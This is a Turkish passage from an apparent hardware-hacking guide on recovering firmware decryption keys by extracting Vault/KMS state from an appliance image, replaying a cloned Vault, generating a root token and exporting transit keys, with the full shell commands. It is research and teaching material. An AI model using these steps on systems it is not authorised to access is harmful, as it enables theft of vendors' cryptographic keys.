## Embedded KMS/Vault state içinden firmware decryption key'lerini kurtarma

Bir update image küçük plaintext metadata ile büyük, high-entropy bir blob'u birlikte içeriyorsa herhangi bir brute-force işleminden önce container triage yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile header'ları, offset'leri ve line boundary'lerini dump edin.
- `Salted__` genellikle OpenSSL `enc` formatını ifade eder: sonraki 8 byte salt'tır ve kalan byte'lar ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 field, büyük olasılıkla random firmware password/session key'i saran bir RSA-2048 ciphertext ile karşı karşıya olduğunuzu gösterir.
- Aynı file içindeki detached PGP material çoğunlukla yalnızca authenticity'yi korur; bunun confidentiality mechanism olduğunu varsaymayın.

Static key hunting (`grep`, `strings`, PEM/PGP searches) başarısız olursa yalnızca private key aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'yi decompile edin ve encrypted blob'u kimin okuduğunu, hangi helper/API'nin bunu unwrap ettiğini ve istenen logical key name'i trace edin.
- Extract edilmiş root filesystem içinde KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'larını ve init script'lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'larını veya local KMS auto-unseal script'lerini private-key material ile eşdeğer kabul edin.

Appliance original Vault binary'sini ve storage backend'ini içeriyorsa bu environment'ı replay etmek genellikle Vault internals'ı yeniden implement etmekten daha kolaydır:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Clone edilmiş KMS üzerinde root yetkisiyle:

- Transit anahtarlarını yalnızca izole clone içinde export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap anahtarını export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA anahtarını, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. Başarısız bir PKCS#1 v1.5 decrypt işlemi ve başarısız bir varsayılan OAEP decrypt işlemi anahtarın yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işleminden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, eski appliance'larda çoğunlukla MD5) tam olarak yeniden uygulayın.

Bu, "encrypted firmware" konusunu daha genel bir probleme dönüştürür: **appliance tarafındaki operasyonel anahtarları kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Senior Seviyesi Beceri, Junior Seviyesi Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlarda zero-day'leri Exploit Etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Smart Device Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Görüyorsun: Şimdi Pwned'sin](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı şarj portu konektöründen Exploit Etmek - Bölüm 2: anti-downgrade'i bypass etmek](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
